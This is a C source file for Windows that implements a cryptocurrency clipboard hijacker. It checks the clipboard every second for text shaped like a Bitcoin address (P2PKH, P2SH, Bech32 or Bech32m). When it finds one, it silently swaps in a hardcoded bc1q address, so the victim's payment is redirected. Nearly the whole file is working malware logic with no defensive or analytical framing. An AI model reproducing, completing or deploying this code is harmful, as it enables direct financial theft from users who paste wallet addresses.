#include <stdio.h>
#include <windows.h>

#include "clipboard.h"
#include "utils.h"
// #include "test.h"

StateCodeProcess main(void)
{
    typedef enum {
        STATE_ANALYZE_CLIPBOARD,
        STATE_MODIFY_CLIPBOARD,
        STATE_CLEAN_CLIPBOARD,
    } StateCodeFunction;

    size_t buffer_size = 256;
    wchar_t buffer[buffer_size];

    const wchar_t *bitcoin_address = L"bc1qz6nadfl5t8ul977walgphmslclez599t680gxl";
    size_t size_bitcoin_address = getStringSize(bitcoin_address);

    StateCodeFunction state = STATE_ANALYZE_CLIPBOARD;

    while (true) {
        switch (state) {
            case STATE_ANALYZE_CLIPBOARD:

                if (getClipboardText(buffer, buffer_size) == STATE_ERROR ) {
                    printf("[ERROR] -- Failed to get clipboard text.\n");
                    return STATE_ERROR;
                }

                int text_size = wcslen(buffer);

                // -------------------------------------------------- Vérification Bitcoin
                // Vérification adresse P2PKH
                if (buffer[0] == L'1') {
                    if (text_size >= 26 && text_size <= 35) {
                        Sleep(1000);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // Vérification adresse P2SH
                if (buffer[0] == L'3') {
                    if (text_size >= 26 && text_size <= 35) {
                        Sleep(1000);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // Vérification adresse Bech32
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                    if (text_size == 42 || text_size == 62) {
                        Sleep(1000);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                // Vérification adresse Bech32m
                if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                    if (text_size == 62) {
                        Sleep(1000);
                        state = STATE_MODIFY_CLIPBOARD;
                        break;
                    }
                }

                Sleep(1000);
                break;

            case STATE_MODIFY_CLIPBOARD:

                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
                    return STATE_ERROR;
                }
                else {
                    Sleep(1000);
                    state = STATE_ANALYZE_CLIPBOARD;
                }

                break;

            case STATE_CLEAN_CLIPBOARD:
                EmptyClipboard();
                Sleep(1000);
                state = STATE_ANALYZE_CLIPBOARD;

                break;
        }
    }

    return STATE_OK;
}